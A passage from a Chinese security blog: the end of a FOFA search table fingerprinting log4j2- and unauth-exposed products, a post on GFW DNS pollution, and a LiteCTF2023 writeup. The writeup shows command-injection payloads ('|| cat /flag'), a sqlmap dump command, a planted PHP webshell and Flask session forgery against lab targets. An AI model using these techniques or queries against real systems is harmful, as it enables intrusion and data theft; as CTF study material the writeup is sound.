<td>Openfire  是根据开源 Apache 许可证获得许可的实时协作 (RTC) 服务器。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Openfire”</td>
</tr>
<tr>
<td>87</td>
<td>Oracle-BEA-WebLogic-Server</td>
<td>Oracle  BEA WebLogic Server</td>
<td>Oracle  BEA WebLogic Server</td>
<td>BEA  WebLogic Server是一个可扩展的, Java Two Enterprise Edition (J2EE) 应用服务器。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Oracle-BEA-WebLogic-Server”</td>
</tr>
<tr>
<td>88</td>
<td>Oracle-Weblogic_interface_7001</td>
<td>Oracle  Weblogic interface 7001</td>
<td>Oracle  Weblogic interface 7001</td>
<td>WebLogic是美商Oracle的主要产品之一，系购并得来。是商业市场上主要的Java应用服务器软件之一，是世界上第一个成功商业化的J2EE应用服务器。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Oracle-Weblogic_interface_7001”</td>
</tr>
<tr>
<td>89</td>
<td>Oracle-BI-Publisher-Enterprise</td>
<td>Oracle  BI-Publisher Enterprise</td>
<td>Oracle  BI Publisher Enterprise</td>
<td>Oracle  XML Publisher是Oracle Corporation的最新报告技术</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Oracle-BI-Publisher-Enterprise”</td>
</tr>
<tr>
<td>90</td>
<td>vmware-vSphere-Web-Client</td>
<td>vmware  vSphere Web-Client</td>
<td>vmware  vSphere Web-Client</td>
<td>vSphere  Web Client是为忙碌的管理员提供的一款通用的、基于浏览器的VMware管理工具，能够监控并管理VMware基础设施。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”vmware-vSphere-Web-Client”</td>
</tr>
<tr>
<td>91</td>
<td>RedHat-JBoss-AS</td>
<td>RedHat  JBoss AS</td>
<td>RedHat  JBoss AS</td>
<td>一种开源的Java  EE 8 兼容应用服务器，让您只需构建Java 应用一次便可部署到所有位置。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”RedHat-JBoss-AS”</td>
</tr>
<tr>
<td>92</td>
<td>用友-ism</td>
<td>用友  ism</td>
<td>yongyou  ism</td>
<td>iSM智能服务管理器。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”用友-ism”</td>
</tr>
<tr>
<td>93</td>
<td>amazon-cloudfront</td>
<td>CloudFront</td>
<td>CloudFront</td>
<td>CloudFront。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”amazon-CloudFront”</td>
</tr>
<tr>
<td>94</td>
<td>vmware-horizon</td>
<td>vmware  Horizon</td>
<td>vmware  Horizon</td>
<td>vmware  Horizon</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”vmware-Horizon”</td>
</tr>
<tr>
<td>95</td>
<td>reactive-mongo</td>
<td>Reactive  Mongo</td>
<td>Reactive  Mongo</td>
<td>Reactive  Mongo</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Reactive_Mongo”</td>
</tr>
<tr>
<td>96</td>
<td>vmware-unified-access-gateway</td>
<td>vmware  Unified Access Gateway</td>
<td>vmware  Unified Access Gateway</td>
<td>vmware  Unified Access Gateway</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”vmware-Unified-Access-Gateway”</td>
</tr>
<tr>
<td>97</td>
<td>FORESCOUT-Administration</td>
<td>FORESCOUT  Administration</td>
<td>FORESCOUT  Administration</td>
<td>FORESCOUT  Administration</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”FORESCOUT-Administration”</td>
</tr>
<tr>
<td>98</td>
<td>vmware-Tanzu-Observability</td>
<td>vmware  Tanzu Observability</td>
<td>vmware  Tanzu Observability</td>
<td>vmware  Tanzu Observability</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”vmware-Tanzu-Observability”</td>
</tr>
<tr>
<td>99</td>
<td>druid-server</td>
<td>druid  server</td>
<td>druid  server</td>
<td>druid  server</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”druid-server”</td>
</tr>
<tr>
<td>100</td>
<td>amazon  CodePipeline</td>
<td>amazon  CodePipeline</td>
<td>amazon  CodePipeline</td>
<td>amazon  CodePipeline</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”amazon-CodePipeline”</td>
</tr>
<tr>
<td>101</td>
<td>CISCO-CloudCenter-Suite</td>
<td>CISCO  CloudCenter Suite</td>
<td>CISCO  CloudCenter Suite</td>
<td>CISCO  CloudCenter Suite</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”CISCO-CloudCenter-Suite”</td>
</tr>
<tr>
<td>102</td>
<td>vmware-Site-Recovery-Manager</td>
<td>vmware  Site Recovery Manager</td>
<td>vmware  Site Recovery Manager</td>
<td>vmware  Site Recovery Manager</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”vmware-Site-Recovery-Manager”</td>
</tr>
<tr>
<td>103</td>
<td>vmware-Spring-Batch</td>
<td>vmware  Spring Batch</td>
<td>vmware  Spring Batch</td>
<td>vmware  Spring Batch</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”vmware-Spring-Batch”</td>
</tr>
<tr>
<td>104</td>
<td>BROADCOM-Advanced-Threat-Protection</td>
<td>BROADCOM  Advanced Threat Protection</td>
<td>BROADCOM  Advanced Threat Protection</td>
<td>BROADCOM  Advanced Threat Protection</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”BROADCOM-Advanced-Threat-Protection”</td>
</tr>
<tr>
<td>105</td>
<td>amazon-greengrass</td>
<td>amazon  greengrass</td>
<td>amazon  greengrass</td>
<td>amazon  greengrass</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”amazon-greengrass”</td>
</tr>
<tr>
<td>106</td>
<td>vmware-Horizon-DaaS</td>
<td>vmware  Horizon DaaS</td>
<td>vmware  Horizon DaaS</td>
<td>vmware  Horizon DaaS</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”vmware-Horizon-DaaS”</td>
</tr>
<tr>
<td>107</td>
<td>Apache-Log4j-Web</td>
<td>Apache  Log4j Web</td>
<td>Apache  Log4j Web</td>
<td>Apache  Log4j Web</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Apache-Log4j-Web”</td>
</tr>
<tr>
<td>108</td>
<td>APACHE-JMeter</td>
<td>APACHE  JMeter</td>
<td>APACHE  JMeter</td>
<td>APACHE  JMeter</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”APACHE-JMeter”</td>
</tr>
<tr>
<td>109</td>
<td>JSPWiki</td>
<td>JSPWiki</td>
<td>JSPWiki</td>
<td>JSPWiki</td>
<td>log4j2,jsqj</td>
<td>body&#x3D;”JSPWiki”</td>
</tr>
<tr>
<td>110</td>
<td>Apache-James</td>
<td>Apache  James</td>
<td>Apache  James</td>
<td>Apache  James</td>
<td>log4j2,jsqj</td>
<td>port&#x3D;”25” &amp;&amp; “James”</td>
</tr>
<tr>
<td>111</td>
<td>Mobilelron</td>
<td>Mobilelron</td>
<td>Mobilelron</td>
<td>Mobilelron</td>
<td>log4j2,jsqj</td>
<td>body&#x3D;”&#x2F;mifs”</td>
</tr>
<tr>
<td>112</td>
<td>UniFi</td>
<td>UniFi</td>
<td>UniFi</td>
<td>UniFi</td>
<td>log4j2,jsqj</td>
<td>title&#x3D;&#x3D;”UniFi”||app&#x3D;”UniFi-Network”||app&#x3D;”UNIFI-unifi-摄像头”</td>
</tr>
<tr>
<td>113</td>
<td>Struts2-more</td>
<td>Struts2  more</td>
<td>Struts2  more</td>
<td>Struts2  more</td>
<td>log4j2,jsqj</td>
<td>header&#x3D;”If-Modified-Since”</td>
</tr>
<tr>
<td>114</td>
<td>projector</td>
<td>projector</td>
<td>projector</td>
<td>Jetbrains  projector</td>
<td>projector,unauth</td>
<td>body&#x3D;”projector-client-web”</td>
</tr>
<tr>
<td>115</td>
<td>jupyter-lab-unauth</td>
<td>Jupyter  Lab unauth</td>
<td>Jupyter  Lab unauth</td>
<td>Jupyter-Lab-unauth</td>
<td>jupyter-lab,unauth</td>
<td>body&#x3D;”jupyter-config-data” &amp;&amp; title&#x3D;”JupyterLab”</td>
</tr>
<tr>
<td>116</td>
<td>shiro</td>
<td>shiro</td>
<td>shiro</td>
<td>Apache-Shiro</td>
<td>shiro</td>
<td>header&#x3D;”rememberMe&#x3D;” || header&#x3D;”&#x3D;deleteMe” || header&#x3D;”shiro-cas” || body&#x3D;” shiro“</td>
</tr>
</tbody></table>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/06/27/FOFA%E8%AF%AD%E6%B3%95%E5%A4%A7%E5%85%A8/" data-id="cljdxuijn0000tkv4dtad141e" data-title="FOFA语法大全" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-GFW和DNS污染" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/05/28/GFW%E5%92%8CDNS%E6%B1%A1%E6%9F%93/" class="article-date">
  <time class="dt-published" datetime="2023-05-28T09:07:42.000Z" itemprop="datePublished">2023-05-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/05/28/GFW%E5%92%8CDNS%E6%B1%A1%E6%9F%93/">GFW和DNS污染</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="GFW简介"><a href="#GFW简介" class="headerlink" title="GFW简介"></a>GFW简介</h1><p><img src="/2023/05/28/GFW%E5%92%8CDNS%E6%B1%A1%E6%9F%93/image-20230528180244395-16852681785851.png"></p>
<h2 id="在地址栏输入网址后回车发生的情况"><a href="#在地址栏输入网址后回车发生的情况" class="headerlink" title="在地址栏输入网址后回车发生的情况"></a>在地址栏输入网址后回车发生的情况</h2><p><img src="/2023/05/28/GFW%E5%92%8CDNS%E6%B1%A1%E6%9F%93/image-20230528182114249.png"></p>
<p>如果DNS缓存中以及hosts文件中没有请求的域名信息，那么客户端就会向本机设置的域名服务器发送一个请求，由于本机设置的域名服务器是8.8.8.8，是国外的一个域名服务器，那么请求数据包就需要经过GFW</p>
<p>假设DNS请求数据包格式如下，</p>
<p><img src="/2023/05/28/GFW%E5%92%8CDNS%E6%B1%A1%E6%9F%93/image-20230528183507139.png"></p>
<h2 id="直接拦截非法DNS请求"><a href="#直接拦截非法DNS请求" class="headerlink" title="直接拦截非法DNS请求"></a>直接拦截非法DNS请求</h2><p>当该数据包经过GFW时，GFW会对数据包的内容进行查看，当发现了该数据包是一个请求 google.com 域名的DNS请求时，正常情况下GFW就在这个地方把数据包拦截下来，不让你进行解析</p>
<h2 id="DNS污染（劫持）"><a href="#DNS污染（劫持）" class="headerlink" title="DNS污染（劫持）"></a>DNS污染（劫持）</h2><p>假设GFW没有拦截请求google域名ip的DNS数据包，那么数据包就能正常到达目的域名服务器，服务器经过一系列查找，最后将google域名ip信息返回给客户端，但是中间仍需要经过GFW</p>
<p>假设返回的数据包如下，在经过GFW时，GFW发现返回数据包中的内容不合法，它就会做一些手脚，</p>
<p><img src="/2023/05/28/GFW%E5%92%8CDNS%E6%B1%A1%E6%9F%93/image-20230528184729327.png"></p>
<p>比如将域名服务器返回给的域名ip更改为一个不存在的ip，</p>
<p><img src="/2023/05/28/GFW%E5%92%8CDNS%E6%B1%A1%E6%9F%93/image-20230528185002425.png"></p>
<p>然后这个被更改后的数据包会返回到客户端，但是由于这个ip是不存在的，客户端无法连接到该ip，因为这个拓扑图中是没有这个9.9.9.8服务器的，也就是说，互连网中没有一台路由器能够找得到这台服务器</p>
<h2 id="TCP重置攻击"><a href="#TCP重置攻击" class="headerlink" title="TCP重置攻击"></a>TCP重置攻击</h2><p>上面两种情况是由于我们不知道google的ip，需要向域名服务器发送DNS请求可能引发的情况。但是输入域名回车的时候，客户端是先查看本机的DNS缓存，然后再检查hosts文件，若这两种方式都没发现域名ip信息，最后才会发送DNS请求</p>
<p>我们可以把google域名和ip的映射关系添加到hosts文件中，这样的话，当我们访问google域名的时候，客户端直接就能知道域名的ip地址，而不需要再向DNS域名服务器发送请求了，</p>
<p>假设此时客户端向google发送的数据包形式如下，</p>
<p><img src="/2023/05/28/GFW%E5%92%8CDNS%E6%B1%A1%E6%9F%93/image-20230528194538679.png"></p>
<p>当这个数据包经过GFW，GFW会解析到应用层的流量数据，当检测到不合法的ip或者内容时，GFW可能会直接把这个数据包给拦截丢弃，也可以伪装成google服务器，将数据包中的ip修改，然后再返回给客户端</p>
<p><img src="/2023/05/28/GFW%E5%92%8CDNS%E6%B1%A1%E6%9F%93/image-20230528195200177.png"></p>
<p><img src="/2023/05/28/GFW%E5%92%8CDNS%E6%B1%A1%E6%9F%93/image-20230528175626640.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/05/28/GFW%E5%92%8CDNS%E6%B1%A1%E6%9F%93/" data-id="cli7d2dbb0000ykv4f5ny6fh3" data-title="GFW和DNS污染" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-LiteCTF2023-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/05/15/LiteCTF2023-writeup/" class="article-date">
  <time class="dt-published" datetime="2023-05-15T14:33:46.000Z" itemprop="datePublished">2023-05-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-writeup/">CTF_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/05/15/LiteCTF2023-writeup/">LiteCTF2023_writeup</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="郑轻小队writeup"><a href="#郑轻小队writeup" class="headerlink" title="郑轻小队writeup"></a>郑轻小队writeup</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="我Flag呢？"><a href="#我Flag呢？" class="headerlink" title="我Flag呢？"></a>我Flag呢？</h2><p>直接查看源码，在源码最下面找到flag</p>
<h3 id="彩蛋1"><a href="#彩蛋1" class="headerlink" title="彩蛋1"></a>彩蛋1</h3><p>然后在<img src="/2023/05/15/LiteCTF2023-writeup/clip_image002.gif" alt="img">这个js代码中，找到彩蛋1 LitCTF{First_t0_The_k3y! (1&#x2F;?)</p>
<h2 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h2><p>直接查看源码，最后在game.js文件中发现flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image004.gif" alt="img"></p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image006.gif" alt="img"></p>
<h2 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h2><p>根据提示，用get和post各传一个参数，提交拿到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image008.gif" alt="img"></p>
<h3 id="彩蛋3"><a href="#彩蛋3" class="headerlink" title="彩蛋3"></a>彩蛋3</h3><p>根据提示 备份文件还有好吃的，dirsearch扫描网站，发现备份文件<a target="_blank" rel="noopener" href="http://www.zip,/">www.zip，</a></p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image010.gif" alt="img"></p>
<p>下载解压在 index.php.bak ，文件中发现彩蛋3</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image012.gif" alt="img"></p>
<h2 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h2><p>ping下并尝试执行whoami，发现有前端限制，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image014.gif" alt="img"></p>
<p>禁用js后，命令可以正常执行，并在根目录下发现了flag文件</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image016.gif" alt="img"></p>
<p>ping 127.0.0.1 || cat &#x2F;flag，拿到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image018.gif" alt="img"></p>
<h2 id="Vim-yyds"><a href="#Vim-yyds" class="headerlink" title="Vim yyds"></a>Vim yyds</h2><p>dirsearch扫描网站，发现index.php.swp文件，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image020.gif" alt="img"></p>
<p>下载打开发现一些明文后端代码</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image022.gif" alt="img"></p>
<p>将 $password的值 Give_Me_Your_Flag base64加密后的密文以post请求发送，同时发送cmd，payload如下</p>
<p>password&#x3D;R2l2ZV9NZV9Zb3VyX0ZsYWc&#x3D;&amp;&amp;cmd&#x3D;cat &#x2F;flag</p>
<p>如下图所示，拿到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image024.gif" alt="img"></p>
<h2 id="PHP是世界上最好的语言！！"><a href="#PHP是世界上最好的语言！！" class="headerlink" title="PHP是世界上最好的语言！！"></a>PHP是世界上最好的语言！！</h2><p>发现是个代码执行框，先放段简单php脚本，发现可以执行，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image026.gif" alt="img"></p>
<p>那就好办了，直接cat flag，拿下</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image028.gif" alt="img"></p>
<h2 id="作业管理系统（被判作弊）"><a href="#作业管理系统（被判作弊）" class="headerlink" title="作业管理系统（被判作弊）"></a>作业管理系统（被判作弊）</h2><p>是一个登录框，弱口令爆破得到账号密码为 admin:admin</p>
<p>登录进去后是一个作业管理系统，发现有个上传文件还有创建文件的地方。创建个aa.php文件，内容为一句话木马，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image030.gif" alt="img"></p>
<p><a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:28357/aa.php">http://node4.anna.nssctf.cn:28357/aa.php</a> 直接访问aa.php，发现可用访问，直接用蚁剑连接，最后在根目录下找到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image032.gif" alt="img"></p>
<h3 id="彩蛋2"><a href="#彩蛋2" class="headerlink" title="彩蛋2"></a>彩蛋2</h3><p>登录到管理系统后，发现一个githubURL，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image034.gif" alt="img"></p>
<p>查看得到彩蛋2</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image036.gif" alt="img"></p>
<h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>根据前面得到的彩蛋，拼接得到flag</p>
<p>LitCTF{First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!}</p>
<h2 id="就当无事发生"><a href="#就当无事发生" class="headerlink" title="就当无事发生"></a>就当无事发生</h2><p>一开始没做出来，后来探姬给了提示 Github commit</p>
<p> 想起去探姬github里找找，我github也正好follow了探姬</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image038.gif" alt="img"></p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image040.gif" alt="img"></p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image042.gif" alt="img"></p>
<h2 id="1zjs"><a href="#1zjs" class="headerlink" title="1zjs"></a>1zjs</h2><p>查看网站源码，发现一个js文件</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image044.gif" alt="img"></p>
<p>在js文件中发现可疑php文件</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image046.gif" alt="img"></p>
<p>访问该文件，发现是个fuck代码，但是不知道是什么程序类型的代码。那就一个一个尝试呗，最终试出它是jsfuck代码，直接在控制台运行该fuck代码，拿到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image048.gif" alt="img"></p>
<h2 id="这是什么？SQL-！注一下-！"><a href="#这是什么？SQL-！注一下-！" class="headerlink" title="这是什么？SQL ！注一下 ！"></a>这是什么？SQL ！注一下 ！</h2><p>输入1回车，发现使用get请求，参数为id，值为输入框中输入的。而且sql语句都给出来了，看起来挺简单，直接sqlmap跑，发现存在时间盲注</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image050.gif" alt="img"></p>
<p>经过sqlmap跑，得到数据库，表。最后直接dump跑出flag</p>
<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://invalid.uri/">http://node1.anna.nssctf.cn:28548/?id=1"</a> -p id -D ctftraining -T flag –dump</p>
<p>跑一下payload，得到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image052.gif" alt="img"></p>
<h3 id="彩蛋4"><a href="#彩蛋4" class="headerlink" title="彩蛋4"></a>彩蛋4</h3><p>输入2得到彩蛋4</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image054.gif" alt="img"></p>
<h2 id="Flag点击就送！"><a href="#Flag点击就送！" class="headerlink" title="Flag点击就送！"></a>Flag点击就送！</h2><p>开始是个输入框，随便输入，进入到拿flag界面，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image056.gif" alt="img"></p>
<p>拿flag，但是提醒我不是管理员，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image058.gif" alt="img"></p>
<p>抓包查看流量包，发现session有蹊跷，像是flask session</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image060.gif" alt="img"></p>
<p>使用网上现成的flask session解密脚本尝试一下，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image062.gif" alt="img"></p>
<p>解密成功，那么这个就确定该session就是flask框架中使用的session了</p>
<p>将明文更改为admin形似 {“name”:”admin”} </p>
<p>然后利用该脚本对明文进行加密，得到加密session，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image064.gif" alt="img"></p>
<p>去抓的包中替换掉该session，发送即得flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image066.gif" alt="img"></p>
<h2 id="Http-pro-max-plus"><a href="#Http-pro-max-plus" class="headerlink" title="Http pro max plus"></a>Http pro max plus</h2><p>根据提示加http头</p>
<p>其中的xff不可用，需要使用Client-ip替换下xff</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image068.gif" alt="img"></p>
<p>发送得到新信息，是一个PHP文件</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image070.gif" alt="img"></p>
<p>访问该文件，发现是个 昂…….p站？？？？</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image072.gif" alt="img"></p>
<p>感觉不读，查看源码，又得到了新信息，也是个php文件</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image074.gif" alt="img"></p>
<p>访问就拿到了flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image076.gif" alt="img"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="只需要nc一下"><a href="#只需要nc一下" class="headerlink" title="只需要nc一下~"></a>只需要nc一下~</h2><p>nc连接，查看docker配置文件内容，根据历史命令输入 echo $FLAG，出flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image078.gif" alt="img"></p>
<h2 id="口算题卡"><a href="#口算题卡" class="headerlink" title="口算题卡"></a>口算题卡</h2><p>也是nc连接，然后就慢慢算小学数学题，算100道flag就出来了，一个体力活。</p>
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="世界上最棒的程序员"><a href="#世界上最棒的程序员" class="headerlink" title="世界上最棒的程序员"></a>世界上最棒的程序员</h2><p>把附件导入ida中，搜索关键字 flag 得到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image080.gif" alt="img"></p>
<h2 id="ez-XOR"><a href="#ez-XOR" class="headerlink" title="ez_XOR"></a>ez_XOR</h2><p>把附件导入IDA pro，直接寻找main函数</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image082.gif" alt="img"></p>
<p>找到关键代码</p>
<p>int __cdecl main(int argc, const char **argv, const char **envp)<br> {<br>  char *Format; &#x2F;&#x2F; [esp+0h] [ebp-80h]<br>  char *Str2; &#x2F;&#x2F; [esp+4h] [ebp-7Ch]<br>  const char **v6; &#x2F;&#x2F; [esp+8h] [ebp-78h]<br>  char Str1[50]; &#x2F;&#x2F; [esp+1Ch] [ebp-64h] BYREF<br>  _WORD v8[14]; &#x2F;&#x2F; [esp+4Eh] [ebp-32h] BYREF<br>  int v9; &#x2F;&#x2F; [esp+6Ah] [ebp-16h]<br>  int v10; &#x2F;&#x2F; [esp+6Eh] [ebp-12h]<br>  int v11; &#x2F;&#x2F; [esp+72h] [ebp-Eh]<br>  int v12; &#x2F;&#x2F; [esp+76h] [ebp-Ah]<br>  int v13; &#x2F;&#x2F; [esp+7Ah] [ebp-6h]<br>  __int16 v14; &#x2F;&#x2F; [esp+7Eh] [ebp-2h]</p>
<p>  __main();<br>  strcpy((char *)v8, “E<code>&#125;J]OrQF[V8zV:hzpV&#125;fVF[t&quot;);   v8[13] = 0;   v9 = 0;   v10 = 0;   v11 = 0;   v12 = 0;   v13 = 0;   v14 = 0;   printf(&quot;Enter The Right FLAG:&quot;);   scanf(&quot;%s&quot;, Str1);   XOR(Str1, 3);   if ( !strcmp(Str1, (const char *)v8) )   &#123;    printf(&quot;U Saved IT!\n&quot;);    return 0;   &#125;   else   &#123;    printf(&quot;Wrong!Try again!\n&quot;);    return main((int)Format, (const char **)Str2, v6);   &#125;  &#125;  对代码进行分析发现是将值E</code>}J]OrQF[V8zV:hzpV}fVF[t给了v8，分析关键的异或函数，双击进入XOR(Str1, 3);<br> size_t __cdecl XOR(char *Str, int a2)<br> {<br>  size_t result; &#x2F;&#x2F; eax<br>  unsigned int i; &#x2F;&#x2F; [esp+2Ch] [ebp-Ch]</p>
<p>  for ( i &#x3D; 0; ; ++i )<br>  {<br>   result &#x3D; strlen(Str);<br>   if ( i &gt;&#x3D; result )<br>    break;<br>   Str[i] ^&#x3D; 3 * a2; &#x2F;&#x2F;异或的规则<br>  }<br>  return result;<br> }</p>
<p>根据代码，用chatgpt写下脚本，</p>
<p>a &#x3D; “E}J]OrQF[V8zV:hzpV}fVF[t”<br> b &#x3D; “”<br> for c in a:<br>   b +&#x3D; chr(ord(c) ^ 9)<br>   print(b)</p>
<p>跑一下flag就出来了<strong>，</strong></p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image084.gif" alt="img"></p>
<h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>附件是个pyc文件，使用 uncompyle6 对pyc进行反编译，但是报错，</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image086.gif" alt="img"></p>
<p>google后明白了原因：是因为pyc文件的文件头magic number没有对上，需要加上magic number，并且不同python版本的magic number也不同。</p>
<p>如何寻找pyc的magic number以及如何添加magic number，</p>
<p>参考这篇文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44808585/article/details/104148402">https://blog.csdn.net/qq_44808585/article/details/104148402</a></p>
<p>根据文章方法查看到该python版本的magic number，然后使用winhex添加上magic number反编译成功。在代码中找到有关flag的那段程序，运行后得到flag</p>
<p>flag &#x3D; [<br>   30, 196,<br>   52, 252, 49, 220, 7, 243,<br>   3, 241, 24, 224, 40, 230,<br>   25, 251, 28, 233, 40, 237,<br>   4, 225, 4, 215, 40, 231,<br>   22, 237, 14, 251, 10, 169]<br> for i in range(0, len(flag), 2):<br>   flag[i], flag[i + 1] &#x3D; flag[i + 1] ^ 136, flag[i] ^ 119<br> print(bytes(flag).decode())</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image088.gif" alt="img"></p>
<h2 id="debase64"><a href="#debase64" class="headerlink" title="debase64"></a>debase64</h2><p>下载附件，先用ida打开看下，能看到输入20个字符到v15，在sub_401520函数将v15转换到了v4，再拿v4和v6-v14的每个字节进行比较。根据题目和进入sub_401520也可以基本确定sub_401520是个解base64的函数。</p>
<p>之后进入动态调试，步过sub_401520的时候发现这不是普通的base64。动态分析后能发现，原理是把base64解密顺序反过来了，用第四个字符左移两位，第三个字符右移四位这样。故只需写个加密脚本，手动把顺序倒过来就好。因为flag后有3个“&#x3D;”，最后一位根据hint爆破即可。</p>
<p>import hashlib</p>
<p> key &#x3D; “ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;“</p>
<p> for i in key:<br>   str1 &#x3D; f”Y0uReallyKn0wB4s{i}&#x3D;&#x3D;&#x3D;”<br>   if hashlib.md5(str1.encode()).hexdigest() &#x3D;&#x3D; “5a3ebb487ad0046e52db00570339aace”:<br>     print(str1)<br>     break</p>
<p>运行下，拿到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image090.gif" alt="img"></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Hex？Hex！-初级"><a href="#Hex？Hex！-初级" class="headerlink" title="Hex？Hex！(初级)"></a>Hex？Hex！(初级)</h2><p>丢到一键解码工具里</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image092.gif" alt="img"></p>
<h2 id="梦想是红色的-初级"><a href="#梦想是红色的-初级" class="headerlink" title="梦想是红色的 (初级)"></a>梦想是红色的 (初级)</h2><p>一看就是社会主义核心价值观编码，找个在线解码网站，直接拿到flag</p>
<p><img src="/2023/05/15/LiteCTF2023-writeup/clip_image094.gif" alt="img"></p>
